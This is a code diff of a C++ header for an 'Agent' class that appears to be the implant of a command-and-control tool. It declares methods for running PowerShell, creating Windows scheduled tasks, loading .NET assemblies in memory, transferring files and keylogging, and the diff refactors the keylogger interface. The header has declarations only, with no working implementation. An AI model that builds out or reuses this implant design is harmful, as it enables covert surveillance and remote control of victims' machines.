@@ -4,6 +4,9 @@
 #include "CommManager.h"
 #include "TaskQueueManager.h"
 #include <windows.h>
+#include "Upload.h"
+#include "Download.h"
+#include "Keylogger.h"
 
 class Agent
 {
@@ -28,20 +31,18 @@ public:
 	// Agent base commands
 	void Exit();
 	Response GetUID(const int &taskID, const bool &isTrue);
-	Response ExecutePowerShell(const int &taskID, const CommandPowershell &psRequest);
+	Response ExecutePowerShell(const int &taskID, const CommandPowershell &request);
+	Response CreateWindowsTaskW(const int &taskID, const CommandWinTask &request);
+	Response ExecuteNetAsm(const int &taskID, const CommandNetAsm &request);
 	Response UploadFile(const int &taskID, const CommandUploadFile &uploadRequest);
 	Response DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest);
-	Response keylog_start(const int &taskID, const keyloggerStartRequest &keyloggerStartRequest);
-	Response get_keylog_data(const int &taskID, const keyloggerStopRequest &keyloggerStopRequest);
+	Response ExecuteKeylogger(const int &taskID, const int &code);
 
-
-	Response ExecutePowerShell(const int& taskID, const CommandPowershell& request);
-	Response CreateWindowsTaskW(const int& taskID, const CommandWinTask& request);
-	Response ExecuteNetAsm(const int& taskID, const CommandNetAsm& request);
 private:
+	Keylogger keylogger;
 	CommManager commManager;
 	TaskQueueManager taskManager;
-	std::string CaptureCommandOutput(const std::string& cmd);
-	HRESULT DotnetExecute(_In_  PBYTE  AssemblyBytes, _In_  ULONG  AssemblySize, _In_  PWSTR  AppDomainName, _In_  PWSTR  Arguments, _Out_ LPSTR* OutputBuffer, _Out_ PULONG OutputLength);
+	std::string CaptureCommandOutput(const std::string &cmd);
+	HRESULT DotnetExecute(_In_ PBYTE AssemblyBytes, _In_ ULONG AssemblySize, _In_ PWSTR AppDomainName, _In_ PWSTR Arguments, _Out_ LPSTR *OutputBuffer, _Out_ PULONG OutputLength);
 };
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
